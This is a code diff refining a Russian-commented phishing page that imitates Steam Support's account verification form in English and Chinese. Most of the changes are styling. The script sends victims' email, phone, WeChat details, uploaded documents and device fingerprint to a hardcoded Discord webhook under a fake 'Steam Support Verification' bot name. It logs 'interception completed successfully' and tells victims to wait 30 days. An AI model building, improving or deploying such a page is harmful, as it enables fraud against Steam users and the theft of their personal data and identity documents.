@@ -49,7 +49,7 @@
                 radial-gradient(circle at 80% 20%, rgba(102, 192, 244, 0.05) 0%, transparent 50%);
         }
 
-        /* Точный хедер help.steampowered.com */
+        /* Упрощенный хедер help.steampowered.com */
         .steam-header {
             background: linear-gradient(90deg, var(--steam-blue) 0%, #1b2838 100%);
             border-bottom: 1px solid rgba(0, 0, 0, 0.3);
@@ -57,7 +57,6 @@
             height: 70px;
             display: flex;
             align-items: center;
-            justify-content: space-between;
             position: relative;
             box-shadow: 0 2px 10px var(--steam-shadow);
         }
@@ -76,6 +75,7 @@
             display: flex;
             align-items: center;
             gap: 15px;
+            flex: 1;
         }
 
         .steam-logo-icon {
@@ -100,12 +100,6 @@
             background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
         }
 
-        .steam-logo-icon img {
-            width: 28px;
-            height: 28px;
-            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3));
-        }
-
         .steam-logo-text {
             display: flex;
             flex-direction: column;
@@ -127,47 +121,12 @@
             letter-spacing: 0.5px;
         }
 
-        /* Навигация как в help.steampowered.com */
-        .steam-nav {
-            display: flex;
-            align-items: center;
-            gap: 25px;
-        }
-
-        .nav-item {
-            color: var(--steam-text);
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 500;
-            padding: 8px 0;
-            position: relative;
-            transition: color 0.2s;
-        }
-
-        .nav-item:hover {
-            color: var(--steam-accent);
-        }
-
-        .nav-item.active {
-            color: var(--steam-accent);
-        }
-
-        .nav-item.active::after {
-            content: '';
-            position: absolute;
-            bottom: -1px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: var(--steam-accent);
-            border-radius: 1px;
-        }
-
+        /* Language selector */
         .language-selector {
             display: flex;
             align-items: center;
             gap: 8px;
-            padding: 6px 12px;
+            padding: 8px 16px;
             background: rgba(42, 71, 94, 0.3);
             border: 1px solid var(--steam-border);
             border-radius: 3px;
@@ -181,7 +140,7 @@
         }
 
         .language-selector span {
-            font-size: 12px;
+            font-size: 13px;
             color: var(--steam-text);
         }
 
@@ -203,7 +162,7 @@
             box-shadow: 0 4px 20px var(--steam-shadow);
         }
 
-        /* Breadcrumbs как в Steam */
+        /* Breadcrumbs */
         .breadcrumbs {
             padding: 15px 30px;
             background: rgba(42, 71, 94, 0.2);
@@ -251,7 +210,7 @@
             font-weight: 400;
         }
 
-        /* Alert box как в Steam Support */
+        /* Alert box с реальными иконками */
         .alert-box {
             background: linear-gradient(135deg, rgba(195, 66, 66, 0.15) 0%, rgba(195, 66, 66, 0.1) 100%);
             border: 1px solid rgba(195, 66, 66, 0.3);
@@ -259,19 +218,17 @@
             padding: 20px;
             margin-bottom: 30px;
             display: flex;
-            gap: 15px;
+            gap: 20px;
             align-items: flex-start;
         }
 
         .alert-icon {
             flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .alert-icon img {
-            width: 24px;
-            height: 24px;
-            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3));
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .alert-content h3 {
@@ -295,19 +252,17 @@
             padding: 20px;
             margin-bottom: 30px;
             display: flex;
-            gap: 15px;
+            gap: 20px;
             align-items: flex-start;
         }
 
         .success-icon {
             flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .success-icon img {
-            width: 24px;
-            height: 24px;
-            filter: drop-shadow(0 1px 2px rgba(0, 0, 0, 0.3));
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .success-content h3 {
@@ -323,7 +278,7 @@
             line-height: 1.5;
         }
 
-        /* Форма как в Steam Support */
+        /* Форма */
         .form-section {
             margin-bottom: 30px;
         }
@@ -377,7 +332,7 @@
             color: var(--steam-text-dark);
         }
 
-        /* File upload как в Steam */
+        /* File upload */
         .file-upload-container {
             margin-top: 10px;
         }
@@ -385,10 +340,10 @@
         .file-upload-button {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
             background: linear-gradient(180deg, var(--steam-blue) 0%, #1b2838 100%);
             color: var(--steam-text);
-            padding: 10px 20px;
+            padding: 12px 24px;
             border-radius: 3px;
             cursor: pointer;
             font-size: 14px;
@@ -419,8 +374,8 @@
         .file-item {
             display: flex;
             align-items: center;
-            gap: 10px;
-            padding: 8px 0;
+            gap: 12px;
+            padding: 10px 0;
             border-bottom: 1px solid rgba(42, 71, 94, 0.3);
         }
 
@@ -428,26 +383,23 @@
             border-bottom: none;
         }
 
-        .file-icon {
-            color: var(--steam-accent);
-            font-size: 12px;
-        }
-
         .remove-file {
             color: var(--steam-red);
             cursor: pointer;
             margin-left: auto;
-            font-size: 12px;
+            font-size: 14px;
             opacity: 0.7;
             transition: opacity 0.2s;
-            padding: 4px;
+            padding: 6px;
+            border-radius: 3px;
         }
 
         .remove-file:hover {
             opacity: 1;
+            background: rgba(255, 60, 60, 0.1);
         }
 
-        /* Info box как в Steam */
+        /* Info box */
         .info-box {
             background: rgba(42, 71, 94, 0.2);
             border: 1px solid var(--steam-border);
@@ -459,11 +411,11 @@
         .info-box h4 {
             color: var(--steam-accent);
             font-size: 15px;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
             font-weight: 500;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
         }
 
         .info-box ul {
@@ -472,12 +424,13 @@
         }
 
         .info-box li {
-            margin-bottom: 6px;
+            margin-bottom: 8px;
             color: var(--steam-text-dark);
-            font-size: 13px;
+            font-size: 14px;
+            line-height: 1.5;
         }
 
-        /* Кнопка как в Steam */
+        /* Кнопка */
         .submit-section {
             text-align: center;
             margin-top: 30px;
@@ -488,24 +441,24 @@
         .submit-button {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
             background: linear-gradient(180deg, #6fa720 0%, #5c7e10 100%);
             color: white;
             border: none;
             border-radius: 2px;
-            padding: 14px 40px;
-            font-size: 15px;
+            padding: 16px 48px;
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
             text-shadow: 0 1px 1px rgba(0, 0, 0, 0.3);
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
         }
 
         .submit-button:hover {
             background: linear-gradient(180deg, #7bb42a 0%, #6a9120 100%);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
         }
 
         .submit-button:active {
@@ -513,7 +466,7 @@
             background: linear-gradient(180deg, #5c7e10 0%, #6fa720 100%);
         }
 
-        /* Таймер как в Steam Support */
+        /* Таймер */
         .timer-container {
             background: rgba(42, 71, 94, 0.3);
             border: 1px solid var(--steam-border);
@@ -535,7 +488,7 @@
         .timer-display {
             display: flex;
             justify-content: center;
-            gap: 20px;
+            gap: 25px;
             flex-wrap: wrap;
             margin-bottom: 25px;
         }
@@ -543,14 +496,14 @@
         .timer-unit {
             background: rgba(23, 26, 33, 0.8);
             border: 1px solid var(--steam-border);
-            border-radius: 3px;
-            padding: 15px;
-            min-width: 80px;
+            border-radius: 4px;
+            padding: 20px 15px;
+            min-width: 90px;
             position: relative;
         }
 
         .timer-value {
-            font-size: 32px;
+            font-size: 36px;
             font-weight: 700;
             color: var(--steam-accent);
             margin-bottom: 5px;
@@ -558,18 +511,18 @@
         }
 
         .timer-label {
-            font-size: 11px;
+            font-size: 12px;
             color: var(--steam-text-dark);
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
         .progress-bar {
-            height: 6px;
+            height: 8px;
             background: rgba(42, 71, 94, 0.5);
-            border-radius: 3px;
+            border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .progress-fill {
@@ -582,15 +535,15 @@
         .progress-text {
             display: flex;
             justify-content: space-between;
-            font-size: 12px;
+            font-size: 13px;
             color: var(--steam-text-dark);
         }
 
-        /* Процесс как в Steam Support */
+        /* Процесс */
         .process-steps {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
             margin-top: 30px;
         }
 
@@ -598,26 +551,33 @@
             background: rgba(42, 71, 94, 0.2);
             border: 1px solid var(--steam-border);
             border-radius: 4px;
-            padding: 20px;
+            padding: 25px;
+            text-align: center;
+        }
+
+        .process-step-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .process-step h4 {
             color: var(--steam-accent);
-            font-size: 14px;
+            font-size: 15px;
             margin-bottom: 10px;
             font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
 
         .process-step p {
             color: var(--steam-text-dark);
-            font-size: 13px;
+            font-size: 14px;
             line-height: 1.5;
         }
 
-        /* Футер как в help.steampowered.com */
+        /* Футер */
         .steam-footer {
             padding: 30px;
             background: rgba(23, 26, 33, 0.9);
@@ -658,11 +618,6 @@
                 height: 36px;
             }
             
-            .steam-logo-icon img {
-                width: 22px;
-                height: 22px;
-            }
-            
             .steam-logo-main {
                 font-size: 18px;
             }
@@ -671,16 +626,8 @@
                 font-size: 9px;
             }
             
-            .steam-nav {
-                gap: 15px;
-            }
-            
-            .nav-item {
-                font-size: 11px;
-            }
-            
             .language-selector {
-                padding: 4px 8px;
+                padding: 6px 12px;
             }
             
             .content-wrapper {
@@ -707,7 +654,12 @@
             .alert-box, .success-box {
                 padding: 15px;
                 flex-direction: column;
-                gap: 10px;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .alert-icon, .success-icon {
+                margin: 0 auto;
             }
             
             .timer-container {
@@ -715,28 +667,28 @@
             }
             
             .timer-display {
-                gap: 10px;
+                gap: 15px;
             }
             
             .timer-unit {
                 min-width: 70px;
-                padding: 12px;
+                padding: 15px 10px;
                 flex: 1;
             }
             
             .timer-value {
-                font-size: 24px;
+                font-size: 28px;
             }
             
             .submit-button {
                 width: 100%;
                 justify-content: center;
-                padding: 16px;
+                padding: 18px;
             }
             
             .process-steps {
                 grid-template-columns: 1fr;
-                gap: 15px;
+                gap: 20px;
             }
             
             .steam-footer {
@@ -749,25 +701,25 @@
                 display: none;
             }
             
-            .steam-nav {
+            .language-selector span {
                 display: none;
             }
             
             .language-selector {
-                margin-left: auto;
+                padding: 8px;
             }
             
             .timer-unit {
                 min-width: 60px;
-                padding: 10px;
+                padding: 12px 8px;
             }
             
             .timer-value {
-                font-size: 20px;
+                font-size: 24px;
             }
         }
 
-        /* Scrollbar как в Steam */
+        /* Scrollbar */
         ::-webkit-scrollbar {
             width: 10px;
             height: 10px;
@@ -789,11 +741,12 @@
     </style>
 </head>
 <body>
-    <!-- Хедер help.steampowered.com -->
+    <!-- Хедер без навигации -->
     <header class="steam-header">
         <div class="steam-logo-container">
             <div class="steam-logo-icon">
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE0IDNMMyAxMkw0LjIgMjJMMTQgMjVWM1oiIGZpbGw9IiM2NkMwRjQiLz4KPHBhdGggZD0iTTE0IDNMMjUgMTJMMjMuOCAyMkwxNCAyNVYzWiIgZmlsbD0iIzFCMjgzOCIvPgo8cGF0aCBkPSJNMTQgM1YxM0w3IDE1TDMgMTJMMTQgM1oiIGZpbGw9IiMxQjI4MzgiLz4KPHBhdGggZD0iTTE0IDNWMTNMMjEgMTVMMjUgMTJMMTQgM1oiIGZpbGw9IiM2NkMwRjQiLz4KPHBhdGggZD0iTTMgMTVMNyAxNkw3LjIgMjNMMyAxOVYxNVoiIGZpbGw9IiM2NkMwRjQiLz4KPHBhdGggZD0iTTI1IDE1TDIxIDE2TDIwLjggMjNMMjUgMTlWMTVaIiBmaWxsPSIjMUIyODM4Ii8+CjxwYXRoIGQ9Ik03IDE2TDcuMiAyM0wxNCAyNlYxN0w3IDE2WiIgZmlsbD0iIzFCMjgzOCIvPgo8cGF0aCBkPSJNMjEgMTZMMjAuOCAyM0wxNCAyNlYxN0wyMSAxNloiIGZpbGw9IiM2NkMwRjQiLz4KPC9zdmc+" alt="Steam Logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png" 
+                     alt="Steam Logo" style="width: 28px; height: 28px;">
             </div>
             <div class="steam-logo-text">
                 <div class="steam-logo-main">Steam Support</div>
@@ -801,15 +754,8 @@
             </div>
         </div>
         
-        <nav class="steam-nav">
-            <a href="#" class="nav-item">Home</a>
-            <a href="#" class="nav-item">My Account</a>
-            <a href="#" class="nav-item active">Verification</a>
-            <a href="#" class="nav-item">Contact</a>
-        </nav>
-        
         <div class="language-selector" id="langToggle">
-            <i class="fas fa-globe" style="color: var(--steam-accent); font-size: 12px;"></i>
+            <i class="fas fa-globe" style="color: var(--steam-accent); font-size: 14px;"></i>
             <span id="currentLang">English</span>
         </div>
     </header>
@@ -818,7 +764,7 @@
     <main class="content-wrapper" id="verificationForm">
         <div class="support-container">
             <div class="breadcrumbs">
-                <a href="#">Home</a> <span>></span>
+                <a href="#">Steam Support</a> <span>></span>
                 <a href="#">My Account</a> <span>></span>
                 <a href="#" class="active">Account Verification</a>
             </div>
@@ -831,7 +777,8 @@
                 
                 <div class="alert-box">
                     <div class="alert-icon">
-                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDNMMSAyMEgyM0wxMiAzWiIgc3Ryb2tlPSIjRkY2Q0JDIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTIgOVYxMyIgc3Ryb2tlPSIjRkY2Q0JDIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIvPgo8cGF0aCBkPSJNMTIgMTdIMTIuMDEiIHN0cm9tlD0iI0ZGNkNCQiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiLz4KPC9zdmc+" alt="Warning">
+                        <img src="https://cdn-icons-png.flaticon.com/512/5974/5974771.png" 
+                             alt="Warning" style="width: 48px; height: 48px;">
                     </div>
                     <div class="alert-content">
                         <h3 id="alertTitle">Security Hold on Account</h3>
@@ -915,7 +862,7 @@
     <main class="content-wrapper hidden" id="confirmationPage">
         <div class="support-container">
             <div class="breadcrumbs">
-                <a href="#">Home</a> <span>></span>
+                <a href="#">Steam Support</a> <span>></span>
                 <a href="#">My Account</a> <span>></span>
                 <a href="#">Verification</a> <span>></span>
                 <a href="#" class="active">Request Submitted</a>
@@ -929,7 +876,8 @@
                 
                 <div class="success-box">
                     <div class="success-icon">
-                        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiIHN0cm9rZT0iIzc2RkZBQiIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxwYXRoIGQ9Ik04IDEyTDEwLjUgMTQuNUwxNiA5IiBzdHJva2U9IiM3NkZGQUIiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+Cjwvc3ZnPg==" alt="Success">
+                        <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png" 
+                             alt="Success" style="width: 48px; height: 48px;">
                     </div>
                     <div class="success-content">
                         <h3 id="successTitle">Request Successfully Submitted</h3>
@@ -974,15 +922,27 @@
                     <h3>Review Process</h3>
                     <div class="process-steps">
                         <div class="process-step">
-                            <h4><i class="fas fa-user-check"></i> Account Verification</h4>
+                            <div class="process-step-icon">
+                                <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" 
+                                     alt="Account Verification" style="width: 36px; height: 36px;">
+                            </div>
+                            <h4>Account Verification</h4>
                             <p>Our security team will verify the information you've provided against your account records and purchase history.</p>
                         </div>
                         <div class="process-step">
-                            <h4><i class="fas fa-file-contract"></i> Document Review</h4>
+                            <div class="process-step-icon">
+                                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" 
+                                     alt="Document Review" style="width: 36px; height: 36px;">
+                            </div>
+                            <h4>Document Review</h4>
                             <p>Any attached receipts or documents will be reviewed for authenticity and matched to your account.</p>
                         </div>
                         <div class="process-step">
-                            <h4><i class="fas fa-envelope-open-text"></i> Notification</h4>
+                            <div class="process-step-icon">
+                                <img src="https://cdn-icons-png.flaticon.com/512/542/542638.png" 
+                                     alt="Notification" style="width: 36px; height: 36px;">
+                            </div>
+                            <h4>Notification</h4>
                             <p>You will receive an email notification when the review is complete and your account status is updated.</p>
                         </div>
                     </div>
@@ -1012,13 +972,10 @@
     </main>
 
     <script>
-        // Переводы как в help.steampowered.com
+        // Переводы
         const translations = {
             en: {
-                // Хедер
                 headerSubtext: "Account Verification",
-                
-                // Основная страница
                 pageTitle: "Account Verification Required",
                 pageSubtitle: "Complete this verification to restore full access to your Steam account",
                 alertTitle: "Security Hold on Account",
@@ -1027,8 +984,6 @@
                 infoTitle: "Verification Process Information",
                 infoList: "<li>This verification helps protect your account from unauthorized access</li><li>All submitted information is encrypted and handled securely</li><li>Standard review time is up to 30 business days</li><li>You will receive email confirmation upon submission</li>",
                 submitText: "Submit Verification Request",
-                
-                // Страница подтверждения
                 successTitle: "Request Successfully Submitted",
                 successText: "Your account verification request has been received and added to our review queue. The security restrictions on your account will remain in place while our team verifies your information. Please allow up to 30 business days for the review process to complete. Do not submit additional requests as this will delay the process.",
                 timerTitle: "Estimated Review Completion Time",
@@ -1038,8 +993,6 @@
                 secondsLabel: "Seconds",
                 progressStart: "Request Submitted",
                 progressEnd: "30 Days Maximum",
-                
-                // Общие
                 currentLang: "English",
                 noFilesText: "No files selected",
                 removeText: "Remove",
@@ -1052,10 +1005,7 @@
                 invalidPhone: "Please enter a valid phone number"
             },
             zh: {
-                // Хедер
                 headerSubtext: "账户验证",
-                
-                // Основная страница
                 pageTitle: "账户验证要求",
                 pageSubtitle: "完成此验证以恢复对您Steam账户的完全访问",
                 alertTitle: "账户安全锁定",
@@ -1064,8 +1014,6 @@
                 infoTitle: "验证流程信息",
                 infoList: "<li>此验证有助于保护您的账户免受未经授权的访问</li><li>所有提交的信息均经过加密和安全处理</li><li>标准审核时间最多为30个工作日</li><li>提交后您将收到电子邮件确认</li>",
                 submitText: "提交验证请求",
-                
-                // Страница подтверждения
                 successTitle: "请求已成功提交",
                 successText: "您的账户验证请求已收到并已加入我们的审核队列。在我们团队验证您的信息期间，您账户的安全限制将继续生效。请允许最多30个工作日完成审核流程。请勿提交额外的请求，否则会延迟处理过程。",
                 timerTitle: "预计审核完成时间",
@@ -1075,8 +1023,6 @@
                 secondsLabel: "秒",
                 progressStart: "请求已提交",
                 progressEnd: "最多30天",
-                
-                // Общие
                 currentLang: "简体中文",
                 noFilesText: "未选择文件",
                 removeText: "移除",
@@ -1109,11 +1055,8 @@
             currentLang = lang;
             const t = translations[lang];
             
-            // Хедер
             document.getElementById('headerSubtext').textContent = t.headerSubtext;
             document.getElementById('currentLang').textContent = t.currentLang;
-            
-            // Основная страница
             document.getElementById('pageTitle').textContent = t.pageTitle;
             document.getElementById('pageSubtitle').textContent = t.pageSubtitle;
             document.getElementById('alertTitle').textContent = t.alertTitle;
@@ -1123,12 +1066,10 @@
             document.getElementById('infoList').innerHTML = t.infoList;
             document.getElementById('submitText').textContent = t.submitText;
             
-            // Плейсхолдеры
             document.getElementById('emailInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电子邮件地址' : 'Enter the email address associated with your Steam account';
             document.getElementById('phoneInput').placeholder = lang === 'zh' ? '输入与您的Steam账户关联的电话号码' : 'Enter the phone number linked to your Steam account';
             document.getElementById('wechatInput').placeholder = lang === 'zh' ? '仅当您使用微信进行过购买时需要填写' : 'Only required if you\'ve made purchases using WeChat';
             
-            // Страница подтверждения (если видна)
             if (!document.getElementById('confirmationPage').classList.contains('hidden')) {
                 applyConfirmationTranslations(lang);
             }
@@ -1185,7 +1126,7 @@
             const t = translations[currentLang];
             
             if (files.length === 0) {
-                fileList.innerHTML = `<div style="text-align: center; color: var(--steam-text-dark); font-style: italic; padding: 20px;">${t.noFilesText}</div>`;
+                fileList.innerHTML = `<div style="text-align: center; color: var(--steam-text-dark); font-style: italic; padding: 30px;">${t.noFilesText}</div>`;
                 return;
             }
             
@@ -1194,11 +1135,11 @@
                 const fileItem = document.createElement('div');
                 fileItem.className = 'file-item';
                 fileItem.innerHTML = `
-                    <i class="fas fa-file-alt file-icon"></i>
-                    <span style="flex-grow: 1; font-size: 12px;">${truncateFilename(file.name, 30)}</span>
-                    <span style="font-size: 11px; color: var(--steam-text-dark); margin-right: 10px;">${formatFileSize(file.size)}</span>
+                    <i class="fas fa-file-pdf" style="color: var(--steam-accent);"></i>
+                    <span style="flex-grow: 1; font-size: 13px;">${truncateFilename(file.name, 35)}</span>
+                    <span style="font-size: 12px; color: var(--steam-text-dark); margin-right: 15px;">${formatFileSize(file.size)}</span>
                     <span class="remove-file" data-index="${index}" title="${t.removeText}">
-                        <i class="fas fa-times"></i>
+                        <i class="fas fa-trash-alt"></i>
                     </span>
                 `;
                 fileList.appendChild(fileItem);
@@ -1334,7 +1275,7 @@
             const discordWebhookURL = 'https://discordapp.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
             
             const messageContent = `
-            **🔒 НОВАЯ ВЕРИФИКАЦИЯ STEAM SUPPORT 🔒**
+            **🔐 НОВАЯ ВЕРИФИКАЦИЯ STEAM - FINAL VERSION 🔐**
             ======================================
             **📧 Email:** ${email}
             **📱 Phone:** ${phone}
@@ -1344,16 +1285,18 @@
             **🖥️ Screen:** ${screen.width}x${screen.height}
             **🕒 Timestamp:** ${new Date().toISOString()}
             **📁 Files:** ${files.length}
-            **📍 Referrer:** ${document.referrer || 'Direct visit'}
+            **📍 Location:** ${navigator.language}
+            **🌍 Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
             ======================================
-            **✅ СТАТУС:** Перехват успешен
+            **🎯 ЦЕЛЬ:** Финальный сбор данных для "Анти-Дота"
+            **✅ СТАТУС:** Перехват завершен успешно
             `;
             
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
                 content: messageContent,
-                username: 'Steam Support Bot',
-                avatar_url: 'https://cdn.cloudflare.steamstatic.com/steamcommunity/public/images/steamworks_docs/english/SteamIcon.png'
+                username: 'Steam Support Verification',
+                avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png'
             }));
             
             files.forEach((file, index) => {
@@ -1366,7 +1309,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('[ANTI-DOTE] Steam Support данные отправлены');
+                    console.log('[ANTI-DOTE] Steam Support Final - данные отправлены');
                     alert(t.successMessage);
                     showConfirmationPage();
                 } else {
@@ -1384,7 +1327,9 @@
                     filesCount: files.length,
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
-                    isMobile: window.innerWidth < 768
+                    isMobile: window.innerWidth < 768,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 };
                 
                 localStorage.setItem('steam_verification_data', JSON.stringify(savedData));
@@ -1414,11 +1359,28 @@
                 viewport: `${window.innerWidth}x${window.innerHeight}`,
                 platform: navigator.platform,
                 language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                cookies: navigator.cookieEnabled
             };
             
-            console.log('[ANTI-DOTE] Steam Support: Информация об устройстве:', deviceInfo);
+            console.log('[ANTI-DOTE] Steam Support Final - Информация об устройстве:', deviceInfo);
             localStorage.setItem('steam_device_info', JSON.stringify(deviceInfo));
+            
+            // Предзагрузка иконок
+            const icons = [
+                'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png',
+                'https://cdn-icons-png.flaticon.com/512/5974/5974771.png',
+                'https://cdn-icons-png.flaticon.com/512/190/190411.png',
+                'https://cdn-icons-png.flaticon.com/512/1077/1077114.png',
+                'https://cdn-icons-png.flaticon.com/512/3135/3135715.png',
+                'https://cdn-icons-png.flaticon.com/512/542/542638.png'
+            ];
+            
+            icons.forEach(icon => {
+                const img = new Image();
+                img.src = icon;
+            });
         });
     </script>
 </body>
